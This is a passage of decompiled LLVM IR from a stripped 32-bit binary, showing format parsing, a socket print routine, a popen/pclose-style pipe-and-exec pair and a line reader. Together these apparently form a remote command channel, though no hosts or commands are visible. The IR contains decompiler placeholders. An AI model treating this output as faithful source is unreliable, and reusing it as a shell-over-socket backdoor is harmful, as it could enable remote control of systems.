  %v10_8048ab8 = icmp eq i8 %v2_8048ab5, 120
  %v1_8048aba = icmp eq i1 %v10_8048ab8, false
  br i1 %v1_8048aba, label %dec_label_pc_8048b06, label %dec_label_pc_8048abc

dec_label_pc_8048abc:                             ; preds = %dec_label_pc_8048ab2
  %v1_8048abf = add i32 %stack_var_12.161, 4
  %v1_8048ac7 = inttoptr i32 %stack_var_12.161 to i32*
  %v2_8048ac7 = load i32, i32* %v1_8048ac7, align 4
  store i32 %stack_var_-36.0.lcssa, i32* @edx, align 4
  %v8_8048af9 = sext i32 %v2_8048ac7 to i64
  %v9_8048af9 = call i32 @function_804881c(i32 %tmp6, i64 %v8_8048af9, i32 16, i32 0, i32 %stack_var_-36.0.lcssa, i32 %stack_var_-32.0.lcssa, i32 97)
  %v5_8048afe = add i32 %v9_8048af9, %stack_var_-28.162
  br label %dec_label_pc_8048c09

dec_label_pc_8048b06:                             ; preds = %dec_label_pc_8048ab2
  %v2_8048b09 = load i8, i8* %stack_var_8.1.lcssa, align 1
  %v10_8048b0c = icmp eq i8 %v2_8048b09, 88
  %v1_8048b0e = icmp eq i1 %v10_8048b0c, false
  br i1 %v1_8048b0e, label %dec_label_pc_8048b5a, label %dec_label_pc_8048b10

dec_label_pc_8048b10:                             ; preds = %dec_label_pc_8048b06
  %v1_8048b13 = add i32 %stack_var_12.161, 4
  %v1_8048b1b = inttoptr i32 %stack_var_12.161 to i32*
  %v2_8048b1b = load i32, i32* %v1_8048b1b, align 4
  store i32 %stack_var_-36.0.lcssa, i32* @edx, align 4
  %v8_8048b4d = sext i32 %v2_8048b1b to i64
  %v9_8048b4d = call i32 @function_804881c(i32 %tmp6, i64 %v8_8048b4d, i32 16, i32 0, i32 %stack_var_-36.0.lcssa, i32 %stack_var_-32.0.lcssa, i32 65)
  %v5_8048b52 = add i32 %v9_8048b4d, %stack_var_-28.162
  br label %dec_label_pc_8048c09

dec_label_pc_8048b5a:                             ; preds = %dec_label_pc_8048b06
  %v2_8048b5d = load i8, i8* %stack_var_8.1.lcssa, align 1
  %v10_8048b60 = icmp eq i8 %v2_8048b5d, 117
  %v1_8048b62 = icmp eq i1 %v10_8048b60, false
  br i1 %v1_8048b62, label %dec_label_pc_8048bab, label %dec_label_pc_8048b64

dec_label_pc_8048b64:                             ; preds = %dec_label_pc_8048b5a
  %v1_8048b67 = add i32 %stack_var_12.161, 4
  %v1_8048b6f = inttoptr i32 %stack_var_12.161 to i32*
  %v2_8048b6f = load i32, i32* %v1_8048b6f, align 4
  store i32 %stack_var_-36.0.lcssa, i32* @edx, align 4
  %v8_8048ba1 = sext i32 %v2_8048b6f to i64
  %v9_8048ba1 = call i32 @function_804881c(i32 %tmp6, i64 %v8_8048ba1, i32 10, i32 0, i32 %stack_var_-36.0.lcssa, i32 %stack_var_-32.0.lcssa, i32 97)
  %v5_8048ba6 = add i32 %v9_8048ba1, %stack_var_-28.162
  br label %dec_label_pc_8048c09

dec_label_pc_8048bab:                             ; preds = %dec_label_pc_8048b5a
  %v2_8048bae = load i8, i8* %stack_var_8.1.lcssa, align 1
  %v10_8048bb1 = icmp eq i8 %v2_8048bae, 99
  %v1_8048bb3 = icmp eq i1 %v10_8048bb1, false
  br i1 %v1_8048bb3, label %dec_label_pc_8048c09, label %dec_label_pc_8048bb5

dec_label_pc_8048bb5:                             ; preds = %dec_label_pc_8048bab
  %v1_8048bb8 = add i32 %stack_var_12.161, 4
  %v1_8048bc0 = inttoptr i32 %stack_var_12.161 to i32*
  %v2_8048bc0 = load i32, i32* %v1_8048bc0, align 4
  store i32 %v2_8048bc0, i32* %stack_var_-6, align 4
  store i32 %stack_var_-36.0.lcssa, i32* @edx, align 4
  %v6_8048be4 = call i32 @function_8048742(i32 %tmp6, i8* %tmp21, i32 %stack_var_-36.0.lcssa, i32 %stack_var_-32.0.lcssa)
  %v5_8048be9 = add i32 %v6_8048be4, %stack_var_-28.162
  br label %dec_label_pc_8048c09

dec_label_pc_8048bee:                             ; preds = %dec_label_pc_8048999, %dec_label_pc_804896d
  %stack_var_8.2 = phi i8* [ %stack_var_8.463, %dec_label_pc_804896d ], [ %v22_804897b, %dec_label_pc_8048999 ]
  %v2_8048bf1 = load i8, i8* %stack_var_8.2, align 1
  %v3_8048bf1 = zext i8 %v2_8048bf1 to i32
  %v4_8048c01 = call i32 @function_8048700(i32* %arg1, i32 %v3_8048bf1)
  %v4_8048c06 = add i32 %stack_var_-28.162, 1
  br label %dec_label_pc_8048c09

dec_label_pc_8048c09:                             ; preds = %dec_label_pc_8048bab, %dec_label_pc_8048bb5, %dec_label_pc_8048b64, %dec_label_pc_8048b10, %dec_label_pc_8048abc, %dec_label_pc_8048a68, %dec_label_pc_8048a36, %dec_label_pc_8048bee
  %stack_var_8.3 = phi i8* [ %stack_var_8.2, %dec_label_pc_8048bee ], [ %stack_var_8.1.lcssa, %dec_label_pc_8048bab ], [ %stack_var_8.1.lcssa, %dec_label_pc_8048bb5 ], [ %stack_var_8.1.lcssa, %dec_label_pc_8048b64 ], [ %stack_var_8.1.lcssa, %dec_label_pc_8048b10 ], [ %stack_var_8.1.lcssa, %dec_label_pc_8048abc ], [ %stack_var_8.1.lcssa, %dec_label_pc_8048a68 ], [ %stack_var_8.1.lcssa, %dec_label_pc_8048a36 ]
  %stack_var_12.0 = phi i32 [ %stack_var_12.161, %dec_label_pc_8048bee ], [ %stack_var_12.161, %dec_label_pc_8048bab ], [ %v1_8048bb8, %dec_label_pc_8048bb5 ], [ %v1_8048b67, %dec_label_pc_8048b64 ], [ %v1_8048b13, %dec_label_pc_8048b10 ], [ %v1_8048abf, %dec_label_pc_8048abc ], [ %v1_8048a6b, %dec_label_pc_8048a68 ], [ %v1_8048a14, %dec_label_pc_8048a36 ]
  %stack_var_-28.0 = phi i32 [ %v4_8048c06, %dec_label_pc_8048bee ], [ %stack_var_-28.162, %dec_label_pc_8048bab ], [ %v5_8048be9, %dec_label_pc_8048bb5 ], [ %v5_8048ba6, %dec_label_pc_8048b64 ], [ %v5_8048b52, %dec_label_pc_8048b10 ], [ %v5_8048afe, %dec_label_pc_8048abc ], [ %v5_8048aaa, %dec_label_pc_8048a68 ], [ %v5_8048a56, %dec_label_pc_8048a36 ]
  %v4_8048c09 = ptrtoint i8* %stack_var_8.3 to i32
  %v5_8048c09 = add i32 %v4_8048c09, 1
  %stack_var_8.4 = inttoptr i32 %v5_8048c09 to i8*
  %v2_8048c0f = load i8, i8* %stack_var_8.4, align 1
  %v4_8048c12 = icmp eq i8 %v2_8048c0f, 0
  %v1_8048c14 = icmp eq i1 %v4_8048c12, false
  br i1 %v1_8048c14, label %dec_label_pc_804896d, label %dec_label_pc_8048c1a

dec_label_pc_8048c1a:                             ; preds = %dec_label_pc_8048c09, %dec_label_pc_804897b, %dec_label_pc_804895b
  %stack_var_-28.1.lcssa = phi i32 [ 0, %dec_label_pc_804895b ], [ %stack_var_-28.162, %dec_label_pc_804897b ], [ %stack_var_-28.0, %dec_label_pc_8048c09 ]
  %v4_8048c1a = icmp eq i32* %arg1, null
  br i1 %v4_8048c1a, label %dec_label_pc_8048c28, label %dec_label_pc_8048c20

dec_label_pc_8048c20:                             ; preds = %dec_label_pc_8048c1a
  %v2_8048c23 = load i32, i32* %arg1, align 4
  %v1_8048c25 = inttoptr i32 %v2_8048c23 to i8*
  store i8 0, i8* %v1_8048c25, align 1
  br label %dec_label_pc_8048c28

dec_label_pc_8048c28:                             ; preds = %dec_label_pc_8048c1a, %dec_label_pc_8048c20
  %v2_8048c2b = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8048c2b, i32* @ebp, align 4
  ret i32 %stack_var_-28.1.lcssa

; uselistorder directives
  uselistorder i8* %stack_var_8.4, { 1, 0 }
  uselistorder i32 %v5_8048c09, { 1, 0 }
  uselistorder i32 %stack_var_-36.0.lcssa, { 1, 0, 3, 2, 5, 4, 7, 6, 9, 8, 10, 11 }
  uselistorder i8* %stack_var_8.1.lcssa, { 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v5_80489bd, { 1, 0 }
  uselistorder i8* %v22_804897b, { 2, 0, 1, 3, 4 }
  uselistorder i32 %stack_var_8.4.in60, { 1, 0 }
  uselistorder i32 %stack_var_12.161, { 1, 0, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13 }
  uselistorder i32 %stack_var_-28.162, { 0, 2, 1, 8, 7, 6, 5, 4, 3 }
  uselistorder i32* %stack_var_-6, { 1, 0 }
  uselistorder i32 %tmp6, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32*, i32)* @function_8048700, { 0, 4, 1, 2, 3 }
  uselistorder i32* %arg1, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_8048c28, { 1, 0 }
  uselistorder label %dec_label_pc_8048c09, { 7, 1, 0, 2, 3, 4, 5, 6 }
  uselistorder label %dec_label_pc_8048a36, { 1, 0 }
  uselistorder label %dec_label_pc_8048a07, { 1, 0, 2 }
  uselistorder label %dec_label_pc_80489fd, { 1, 0 }
  uselistorder label %dec_label_pc_80489bd, { 1, 0 }
  uselistorder label %dec_label_pc_804896d, { 1, 0 }
}

define i32 @function_8048c2d(i32 %arg1) local_unnamed_addr {
dec_label_pc_8048c2d:
  %stack_var_8 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8048c2d = load i32, i32* @ebp, align 4
  store i32 %v0_8048c2d, i32* %stack_var_-4, align 4
  %v4_8048c2d = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v4_8048c2d, i32* @ebp, align 4
  %v4_8048c36 = ptrtoint i32* %stack_var_8 to i32
  %v4_8048c4e = call i32 @function_804895b(i32* null, i32 %arg1, i32 %v4_8048c36)
  ret i32 %v4_8048c4e

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
}

define i32 @function_8048c55(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_8048c55:
  %stack_var_4 = alloca i32, align 4
  %stack_var_12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8048c55 = load i32, i32* @ebp, align 4
  store i32 %v0_8048c55, i32* %stack_var_-4, align 4
  %v4_8048c55 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v4_8048c55, i32* @ebp, align 4
  %v4_8048c5e = ptrtoint i32* %stack_var_12 to i32
  %v4_8048c75 = call i32 @function_804895b(i32* nonnull %stack_var_4, i32 %arg1, i32 %v4_8048c5e)
  %v2_8048c7a = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8048c7a, i32* @ebp, align 4
  ret i32 %v4_8048c75

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 0, 2, 1 }
}

define i32 @function_8048c7c(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_8048c7c:
  %stack_var_-20 = alloca i32, align 4
  %stack_var_12 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_8048c7f = load i32, i32* @edi, align 4
  store i32 %v0_8048c7f, i32* %stack_var_-8, align 4
  %v1_8048c8a = call i32 @function_80529ba(i32 2048)
  store i32 %v1_8048c8a, i32* %stack_var_-20, align 4
  %v3_8048cab = inttoptr i32 %v1_8048c8a to i8*
  %v4_8048cab = call i32 @function_8051e84(i8* %v3_8048cab, i32 0, i32 2048)
  %v4_8048cb9 = ptrtoint i32* %stack_var_12 to i32
  %v4_8048cd0 = call i32 @function_804895b(i32* nonnull %stack_var_-20, i32 %arg2, i32 %v4_8048cb9)
  %v3_8048ce6 = call i32 @_strlen(i8* %v3_8048cab)
  %v6_8048ced = add i32 %v1_8048c8a, %v3_8048ce6
  %v1_8048cf0 = inttoptr i32 %v6_8048ced to i8*
  store i8 10, i8* %v1_8048cf0, align 1
  store i1 false, i1* @df, align 1
  store i32 %v1_8048c8a, i32* @edi, align 4
  %v3_8048d04 = call i32 @_strlen(i8* %v3_8048cab)
  %v4_8048d24 = call i32 @function_8052758(i32 %arg1, i32 %v1_8048c8a, i32 %v3_8048d04, i32 16384)
  %v1_8048d32 = call i32 @function_8053391(i32 %v1_8048c8a)
  %v2_8048d3d = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8048d3d, i32* @edi, align 4
  ret i32 %v4_8048d24

; uselistorder directives
  uselistorder i32 %v1_8048c8a, { 1, 2, 3, 0, 4, 5 }
  uselistorder i32* %stack_var_-20, { 1, 0 }
}

define i32 @function_8048d40(i32 %arg1, i8* %arg2) local_unnamed_addr {
dec_label_pc_8048d40:
  %tmp7 = call i32 @__decompiler_undefined_function_0()
  %tmp11 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-24 = alloca i32, align 4
  %v4_8048d47 = ptrtoint i8* %arg2 to i32
  %v2_8048d4a = load i8, i8* %arg2, align 1
  %v10_8048d4d = icmp eq i8 %v2_8048d4a, 114
  br i1 %v10_8048d4d, label %dec_label_pc_8048d5b, label %dec_label_pc_8048d51

dec_label_pc_8048d51:                             ; preds = %dec_label_pc_8048d40
  %v2_8048d54 = load i8, i8* %arg2, align 1
  %v10_8048d57 = icmp eq i8 %v2_8048d54, 119
  %v1_8048d59 = icmp eq i1 %v10_8048d57, false
  br i1 %v1_8048d59, label %dec_label_pc_8048f1d, label %dec_label_pc_8048d5b

dec_label_pc_8048d5b:                             ; preds = %dec_label_pc_8048d51, %dec_label_pc_8048d40
  %v1_8048d5e = add i32 %v4_8048d47, 1
  %v1_8048d5f = inttoptr i32 %v1_8048d5e to i8*
  %v2_8048d5f = load i8, i8* %v1_8048d5f, align 1
  %v4_8048d62 = icmp eq i8 %v2_8048d5f, 0
  br i1 %v4_8048d62, label %dec_label_pc_8048d72, label %dec_label_pc_8048f1d

dec_label_pc_8048d72:                             ; preds = %dec_label_pc_8048d5b
  %v2_8048d72 = ptrtoint i32* %stack_var_-24 to i32
  %v2_8048d78 = call i32 @function_8050d70(i32 %v2_8048d72)
  %v2_8048d7d = icmp slt i32 %v2_8048d78, 0
  %v1_8048d7f = icmp eq i1 %v2_8048d7d, false
  br i1 %v1_8048d7f, label %dec_label_pc_8048d8d, label %dec_label_pc_8048f1d

dec_label_pc_8048d8d:                             ; preds = %dec_label_pc_8048d72
  %v0_8048d8d = load i8*, i8** @global_var_80628e0.25, align 4
  %v2_8048d92 = icmp eq i8* %v0_8048d8d, null
  %v1_8048d94 = icmp eq i1 %v2_8048d92, false
  br i1 %v1_8048d94, label %bb, label %dec_label_pc_8048d96

dec_label_pc_8048d96:                             ; preds = %dec_label_pc_8048d8d
  %v0_8048d96 = call i32 @function_8050bec()
  %tmp19 = icmp slt i32 %v0_8048d96, 1
  %tmp20 = icmp eq i1 %tmp19, false
  br i1 %tmp20, label %dec_label_pc_8048db0, label %dec_label_pc_8048f1d

dec_label_pc_8048db0:                             ; preds = %dec_label_pc_8048d96
  %v2_8048db3 = mul i32 %v0_8048d96, 4
  %v2_8048db9 = call i32 @function_80529ba(i32 %v2_8048db3)
  %v1_8048dbe = inttoptr i32 %v2_8048db9 to i8*
  store i8* %v1_8048dbe, i8** @global_var_80628e0.25, align 32
  %v2_8048dc8 = icmp eq i32 %v2_8048db9, 0
  %v1_8048dca = icmp eq i1 %v2_8048dc8, false
  br i1 %v1_8048dca, label %dec_label_pc_8048dd8, label %dec_label_pc_8048f1d

dec_label_pc_8048dd8:                             ; preds = %dec_label_pc_8048db0
  %v1_8048ddb = mul i32 %v0_8048d96, 4
  store i32 %v2_8048db9, i32* @edi, align 4
  %v1_8048dec = and i32 %v2_8048db9, -256
  %v5_8048dee = call i8* @_memset(i8* %v1_8048dbe, i32 %v1_8048dec, i32 %v1_8048ddb)
  br label %bb

bb:                                               ; preds = %dec_label_pc_8048d8d, %dec_label_pc_8048dd8
  %v1_8048df0 = call i32 @function_8050a24(i32 %tmp11)
  %v13_8048dfe = icmp eq i32 %v1_8048df0, -1
  br i1 %v13_8048dfe, label %dec_label_pc_8048e0f, label %dec_label_pc_8048e04

dec_label_pc_8048e04:                             ; preds = %bb
  %v4_8048e04 = icmp eq i32 %v1_8048df0, 0
  %v2_8048e34 = load i8, i8* %arg2, align 1
  %v10_8048e37 = icmp eq i8 %v2_8048e34, 114
  %v1_8048e39 = icmp eq i1 %v10_8048e37, false
  br i1 %v4_8048e04, label %dec_label_pc_8048e31, label %dec_label_pc_8048ed5

dec_label_pc_8048e0f:                             ; preds = %bb
  %v3_8048e0f = load i32, i32* %stack_var_-24, align 4
  %v2_8048e15 = call i32 @function_8050b60(i32 %v3_8048e0f)
  %v2_8048e20 = call i32 @function_8050b60(i32 %tmp7)
  br label %dec_label_pc_8048f1d

dec_label_pc_8048e31:                             ; preds = %dec_label_pc_8048e04
  br i1 %v1_8048e39, label %dec_label_pc_8048e6e, label %dec_label_pc_8048e3b

dec_label_pc_8048e3b:                             ; preds = %dec_label_pc_8048e31
  %v9_8048e3e = icmp eq i32 %tmp7, 1
  br i1 %v9_8048e3e, label %dec_label_pc_8048e61, label %dec_label_pc_8048e43

dec_label_pc_8048e43:                             ; preds = %dec_label_pc_8048e3b
  %v4_8048e51 = call i32 @function_8050b90(i32 %tmp7, i32 1)
  %v2_8048e5c = call i32 @function_8050b60(i32 %tmp7)
  br label %dec_label_pc_8048e61

dec_label_pc_8048e61:                             ; preds = %dec_label_pc_8048e3b, %dec_label_pc_8048e43
  %v3_8048e61 = load i32, i32* %stack_var_-24, align 4
  %v2_8048e67 = call i32 @function_8050b60(i32 %v3_8048e61)
  br label %dec_label_pc_8048e9e

dec_label_pc_8048e6e:                             ; preds = %dec_label_pc_8048e31
  %v3_8048e6e = load i32, i32* %stack_var_-24, align 4
  %v1_8048e71 = icmp eq i32 %v3_8048e6e, 0
  br i1 %v1_8048e71, label %dec_label_pc_8048e93, label %dec_label_pc_8048e75

dec_label_pc_8048e75:                             ; preds = %dec_label_pc_8048e6e
  %v4_8048e83 = call i32 @function_8050b90(i32 %v3_8048e6e, i32 0)
  %v3_8048e88 = load i32, i32* %stack_var_-24, align 4
  %v2_8048e8e = call i32 @function_8050b60(i32 %v3_8048e88)
  br label %dec_label_pc_8048e93

dec_label_pc_8048e93:                             ; preds = %dec_label_pc_8048e6e, %dec_label_pc_8048e75
  %v2_8048e99 = call i32 @function_8050b60(i32 %tmp7)
  br label %dec_label_pc_8048e9e

dec_label_pc_8048e9e:                             ; preds = %dec_label_pc_8048e61, %dec_label_pc_8048e93
  %v8_8048ec4 = call i32 @function_8053cd8(i32 ptrtoint ([8 x i8]* @global_var_805a5a2.28 to i32), i32 ptrtoint ([3 x i8]* @global_var_805a057.27 to i32), i32 ptrtoint ([3 x i8]* @global_var_805a59f.26 to i32), i32 %arg1, i32 0)
  %v2_8048ed0 = call i32 @function_8050ad4(i32 127)
  unreachable

dec_label_pc_8048ed5:                             ; preds = %dec_label_pc_8048e04
  br i1 %v1_8048e39, label %dec_label_pc_8048ef2, label %dec_label_pc_8048edf

dec_label_pc_8048edf:                             ; preds = %dec_label_pc_8048ed5
  %v3_8048edf = load i32, i32* %stack_var_-24, align 4
  %v2_8048eeb = call i32 @function_8050b60(i32 %tmp7)
  br label %dec_label_pc_8048f03

dec_label_pc_8048ef2:                             ; preds = %dec_label_pc_8048ed5
  %v3_8048ef8 = load i32, i32* %stack_var_-24, align 4
  %v2_8048efe = call i32 @function_8050b60(i32 %v3_8048ef8)
  br label %dec_label_pc_8048f03

dec_label_pc_8048f03:                             ; preds = %dec_label_pc_8048edf, %dec_label_pc_8048ef2
  %stack_var_-28.0 = phi i32 [ %tmp7, %dec_label_pc_8048ef2 ], [ %v3_8048edf, %dec_label_pc_8048edf ]
  %v2_8048f06 = mul i32 %stack_var_-28.0, 4
  %v0_8048f0b = load i8*, i8** @global_var_80628e0.25, align 4
  %v1_8048f0b = ptrtoint i8* %v0_8048f0b to i32
  %v2_8048f10 = add i32 %v1_8048f0b, %v2_8048f06
  %v2_8048f15 = inttoptr i32 %v2_8048f10 to i32*
  store i32 %v1_8048df0, i32* %v2_8048f15, align 4
  br label %dec_label_pc_8048f1d

dec_label_pc_8048f1d:                             ; preds = %dec_label_pc_8048db0, %dec_label_pc_8048d96, %dec_label_pc_8048d72, %dec_label_pc_8048d51, %dec_label_pc_8048d5b, %dec_label_pc_8048e0f, %dec_label_pc_8048f03
  %stack_var_-32.0 = phi i32 [ -1, %dec_label_pc_8048e0f ], [ %stack_var_-28.0, %dec_label_pc_8048f03 ], [ -1, %dec_label_pc_8048d5b ], [ -1, %dec_label_pc_8048d51 ], [ -1, %dec_label_pc_8048d72 ], [ -1, %dec_label_pc_8048d96 ], [ -1, %dec_label_pc_8048db0 ]
  ret i32 %stack_var_-32.0

; uselistorder directives
  uselistorder i32 %stack_var_-28.0, { 1, 0 }
  uselistorder i32 %v1_8048df0, { 1, 2, 0 }
  uselistorder i32 %v0_8048d96, { 2, 0, 1 }
  uselistorder i32 %tmp7, { 1, 6, 5, 4, 3, 0, 2 }
  uselistorder i32 (i32, i32)* @function_8050b90, { 1, 0 }
  uselistorder i8* %arg2, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_8048f1d, { 6, 5, 0, 1, 2, 4, 3 }
  uselistorder label %dec_label_pc_8048f03, { 1, 0 }
  uselistorder label %dec_label_pc_8048e9e, { 1, 0 }
  uselistorder label %dec_label_pc_8048e93, { 1, 0 }
  uselistorder label %dec_label_pc_8048e61, { 1, 0 }
  uselistorder label %bb, { 1, 0 }
}

define i32 @function_8048f26(i32 %arg1) local_unnamed_addr {
dec_label_pc_8048f26:
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-268 = alloca i32, align 4
  %stack_var_-136 = alloca i32, align 4
  %stack_var_-264 = alloca i32, align 4
  %v0_8048f2f = load i8*, i8** @global_var_80628e0.25, align 4
  %v2_8048f34 = icmp eq i8* %v0_8048f2f, null
  br i1 %v2_8048f34, label %dec_label_pc_8049093, label %dec_label_pc_8048f38

dec_label_pc_8048f38:                             ; preds = %dec_label_pc_8048f26
  %v1_8048f2f = ptrtoint i8* %v0_8048f2f to i32
  %v2_8048f3b = mul i32 %arg1, 4
  %v2_8048f45 = add i32 %v1_8048f2f, %v2_8048f3b
  %v1_8048f48 = inttoptr i32 %v2_8048f45 to i32*
  %v2_8048f48 = load i32, i32* %v1_8048f48, align 4
  %v1_8048f4a = icmp eq i32 %v2_8048f48, 0
  %v1_8048f4c = icmp eq i1 %v1_8048f4a, false
  br i1 %v1_8048f4c, label %dec_label_pc_8048f5d, label %dec_label_pc_8049093

dec_label_pc_8048f5d:                             ; preds = %dec_label_pc_8048f38
  %v1_8048f63 = call i32 @function_8050b60(i32 %arg1)
  %v2_8048f68 = ptrtoint i32* %stack_var_-264 to i32
  %v1_8048f71 = call i32 @function_8052864(i32 %v2_8048f68)
  %v2_8048f87 = call i32 @function_8052838(i32 %v2_8048f68, i32 2)
  %v2_8048f9d = call i32 @function_8052838(i32 %v2_8048f68, i32 3)
  %v2_8048fb3 = call i32 @function_8052838(i32 %v2_8048f68, i32 1)
  %v4_8048fbe = ptrtoint i32* %stack_var_-136 to i32
  %v3_8048fd3 = bitcast i32* %stack_var_-264 to %_TYPEDEF_sigset_t*
  %v4_8048fd3 = call i32 @function_8050e80(i32 0, %_TYPEDEF_sigset_t* %v3_8048fd3, i32 %v4_8048fbe)
  %v2_8048ff2 = ptrtoint i32* %stack_var_-268 to i32
  br label %dec_label_pc_8048fd8

dec_label_pc_8048fd8:                             ; preds = %dec_label_pc_8049013, %dec_label_pc_8048f5d
  %v0_8048fe0 = load i8*, i8** @global_var_80628e0.25, align 4
  %v1_8048fe0 = ptrtoint i8* %v0_8048fe0 to i32
  %v2_8048fe5 = add i32 %v1_8048fe0, %v2_8048f3b
  %v1_8048fe8 = inttoptr i32 %v2_8048fe5 to i32*
  %v2_8048fe8 = load i32, i32* %v1_8048fe8, align 4
  %v3_8048fff = call i32 @function_8050f08(i32 %v2_8048fe8, i32 %v2_8048ff2, i32 0)
  %v13_804900a = icmp eq i32 %v3_8048fff, -1
  %v1_8049011 = icmp eq i1 %v13_804900a, false
  br i1 %v1_8049011, label %dec_label_pc_804901f, label %dec_label_pc_8049013

dec_label_pc_8049013:                             ; preds = %dec_label_pc_8048fd8
  %v1_8049013 = call i32 @function_8050f90(i32 %v3_8048fff)
  %v1_8049018 = inttoptr i32 %v1_8049013 to i32*
  %v2_8049018 = load i32, i32* %v1_8049018, align 4
  %v9_804901a = icmp eq i32 %v2_8049018, 4
  br i1 %v9_804901a, label %dec_label_pc_8048fd8, label %dec_label_pc_804901f

dec_label_pc_804901f:                             ; preds = %dec_label_pc_8049013, %dec_label_pc_8048fd8
  %v13_804900a.lcssa = phi i1 [ true, %dec_label_pc_8049013 ], [ false, %dec_label_pc_8048fd8 ]
  %v3_8049038 = bitcast i32* %stack_var_-136 to %_TYPEDEF_sigset_t*
  %v4_8049038 = call i32 @function_8050e80(i32 2, %_TYPEDEF_sigset_t* %v3_8049038, i32 0)
  %v2_8049043 = mul i32 %tmp6, 4
  %v0_8049048 = load i8*, i8** @global_var_80628e0.25, align 4
  %v1_8049048 = ptrtoint i8* %v0_8049048 to i32
  %v2_804904d = add i32 %v1_8049048, %v2_8049043
  %v1_8049050 = inttoptr i32 %v2_804904d to i32*
  store i32 0, i32* %v1_8049050, align 4
  br i1 %v13_804900a.lcssa, label %dec_label_pc_8049087, label %dec_label_pc_804905f

dec_label_pc_804905f:                             ; preds = %dec_label_pc_804901f
  %v3_804905f = load i32, i32* %stack_var_-268, align 4
  %v1_804906b = and i32 %v3_804905f, 65280
  %v2_80490721 = udiv i32 %v1_804906b, 256
  br label %dec_label_pc_8049087

dec_label_pc_8049087:                             ; preds = %dec_label_pc_804901f, %dec_label_pc_804905f
  %storemerge2 = phi i32 [ %v2_80490721, %dec_label_pc_804905f ], [ -1, %dec_label_pc_804901f ]
  br label %dec_label_pc_8049093

dec_label_pc_8049093:                             ; preds = %dec_label_pc_8048f26, %dec_label_pc_8048f38, %dec_label_pc_8049087
  %storemerge = phi i32 [ %storemerge2, %dec_label_pc_8049087 ], [ -1, %dec_label_pc_8048f38 ], [ -1, %dec_label_pc_8048f26 ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v3_8048fff, { 1, 0 }
  uselistorder i32 %v2_8048f3b, { 1, 0 }
  uselistorder i8* %v0_8048f2f, { 1, 0 }
  uselistorder i32 (i32, i32)* @function_8052838, { 2, 1, 0 }
  uselistorder i8** @global_var_80628e0.25, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8049093, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8049087, { 1, 0 }
}

define i32 @function_804909b(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_804909b:
  br label %dec_label_pc_80490da

dec_label_pc_80490b1:                             ; preds = %dec_label_pc_80490e2
  %v3_80490c9 = inttoptr i32 %v5_80490e5 to i32*
  %v4_80490c9 = call i32 @function_8050de0(i32 %arg3, i32* %v3_80490c9, i32 1)
  %v4_80490d1 = add nuw i32 %storemerge113, 1
  %v8_80490d4 = icmp eq i32 %v4_80490c9, 0
  %v12_80490d4 = icmp eq i32 %v4_80490c9, 1
  %v1_80490d8 = icmp eq i1 %v12_80490d4, false
  br i1 %v1_80490d8, label %dec_label_pc_80490f0, label %dec_label_pc_80490da

dec_label_pc_80490da:                             ; preds = %dec_label_pc_804909b, %dec_label_pc_80490b1
  %v8_80490d414 = phi i1 [ false, %dec_label_pc_804909b ], [ %v8_80490d4, %dec_label_pc_80490b1 ]
  %storemerge113 = phi i32 [ 0, %dec_label_pc_804909b ], [ %v4_80490d1, %dec_label_pc_80490b1 ]
  %v5_80490e0 = icmp slt i32 %storemerge113, %arg2
  br i1 %v5_80490e0, label %dec_label_pc_80490e2, label %dec_label_pc_80490f0

dec_label_pc_80490e2:                             ; preds = %dec_label_pc_80490da
  %v5_80490e5 = add i32 %storemerge113, %arg1
  %v1_80490e8 = add i32 %v5_80490e5, -1
  %v1_80490e9 = inttoptr i32 %v1_80490e8 to i8*
  %v2_80490e9 = load i8, i8* %v1_80490e9, align 1
  %v10_80490ec = icmp eq i8 %v2_80490e9, 10
  %v1_80490ee = icmp eq i1 %v10_80490ec, false
  br i1 %v1_80490ee, label %dec_label_pc_80490b1, label %dec_label_pc_80490f0

dec_label_pc_80490f0:                             ; preds = %dec_label_pc_80490da, %dec_label_pc_80490e2, %dec_label_pc_80490b1
  %v8_80490d4.lcssa = phi i1 [ %v8_80490d414, %dec_label_pc_80490da ], [ %v8_80490d414, %dec_label_pc_80490e2 ], [ %v8_80490d4, %dec_label_pc_80490b1 ]
  br i1 %v8_80490d4.lcssa, label %dec_label_pc_8049105, label %dec_label_pc_80490f6

dec_label_pc_80490f6:                             ; preds = %dec_label_pc_80490f0
  br label %dec_label_pc_8049105

dec_label_pc_8049105:                             ; preds = %dec_label_pc_80490f0, %dec_label_pc_80490f6
  %storemerge = phi i32 [ %arg1, %dec_label_pc_80490f6 ], [ 0, %dec_label_pc_80490f0 ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v5_80490e5, { 1, 0 }
  uselistorder i32 %storemerge113, { 2, 0, 1 }
  uselistorder i1 %v8_80490d414, { 1, 0 }
  uselistorder i1 %v8_80490d4, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8049105, { 1, 0 }
  uselistorder label %dec_label_pc_80490f0, { 1, 0, 2 }
  uselistorder label %dec_label_pc_80490da, { 1, 0 }
}

define i32 @function_804910a(i8* %arg1) local_unnamed_addr {
dec_label_pc_804910a:
